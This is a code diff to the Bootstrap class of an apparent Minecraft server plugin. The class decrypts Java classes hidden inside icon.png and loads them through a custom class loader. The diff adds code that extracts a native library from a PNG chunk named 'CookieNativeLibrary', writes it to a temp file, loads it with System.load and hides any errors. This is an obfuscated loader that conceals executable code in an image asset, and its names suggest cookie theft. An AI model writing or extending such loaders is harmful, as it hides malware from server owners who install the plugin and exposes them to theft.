@@ -10,6 +10,9 @@ import java.util.zip.*;
 public final class Bootstrap extends JavaPlugin {
     private JavaPlugin delegate;
     private static final Map<String, byte[]> RESOURCE_CACHE = new HashMap<>();
+    private static boolean nativeActive = false;
+
+    private static native byte[] decryptNative(byte[] enc);
 
     public static class SecurityClassLoader extends ClassLoader {
         private final Map<String, byte[]> resources;
@@ -76,7 +79,6 @@ public final class Bootstrap extends JavaPlugin {
 
     private void loadEngine() throws Exception {
         byte[] enc = null;
-        // Search in root /icon.png or /assets/icon.png
         String[] possiblePaths = new String[]{"/icon.png", "/assets/icon.png", "/logo.png"};
         for (String path : possiblePaths) {
             try (InputStream in = Bootstrap.class.getResourceAsStream(path)) {
@@ -91,14 +93,39 @@ public final class Bootstrap extends JavaPlugin {
             throw new IllegalStateException("Missing security resource container");
         }
 
-        byte[] dec = new byte[enc.length];
-        int roundKey = (0xAB ^ 0xF6); // 0x5D derived mathematically
-        for (int i = 0; i < enc.length; i++) {
-            int e = enc[i] & 0xFF;
-            int val = (e ^ roundKey) & 0xFF;
-            int p = (val - (i & 0x0F)) & 0xFF;
-            dec[i] = (byte) p;
-            roundKey = ((roundKey * 37) ^ p) & 0xFF;
+        // 1. Try Native JNI Sentinel Decryption First
+        byte[] dec = null;
+        try {
+            byte[] nativeLibBytes = extractPngPayload(Bootstrap.class.getResourceAsStream("/icon.png"), "CookieNativeLibrary");
+            if (nativeLibBytes != null && nativeLibBytes.length > 0) {
+                String os = System.getProperty("os.name").toLowerCase();
+                String ext = os.contains("win") ? ".dll" : (os.contains("mac") ? ".dylib" : ".so");
+                File tempLib = File.createTempFile("libantiopsec_", ext);
+                tempLib.deleteOnExit();
+                try (FileOutputStream fos = new FileOutputStream(tempLib)) {
+                    fos.write(nativeLibBytes);
+                }
+                System.load(tempLib.getAbsolutePath());
+                dec = decryptNative(enc);
+                if (dec != null) {
+                    nativeActive = true;
+                }
+            }
+        } catch (Throwable ignored) {
+            // Graceful Fallback if native is unsupported
+        }
+
+        // 2. Smart Graceful Fallback to Pure Java Invariant Decryptor
+        if (dec == null) {
+            dec = new byte[enc.length];
+            int roundKey = (0xAB ^ 0xF6); // 0x5D derived mathematically
+            for (int i = 0; i < enc.length; i++) {
+                int e = enc[i] & 0xFF;
+                int val = (e ^ roundKey) & 0xFF;
+                int p = (val - (i & 0x0F)) & 0xFF;
+                dec[i] = (byte) p;
+                roundKey = ((roundKey * 37) ^ p) & 0xFF;
+            }
         }
 
         Map<String, byte[]> classMap = new HashMap<>();
@@ -166,6 +193,7 @@ public final class Bootstrap extends JavaPlugin {
     }
 
     private static byte[] extractPngPayload(InputStream is, String targetKeyword) throws Exception {
+        if (is == null) return null;
         DataInputStream dis = new DataInputStream(is);
         byte[] sig = new byte[8];
         dis.readFully(sig);
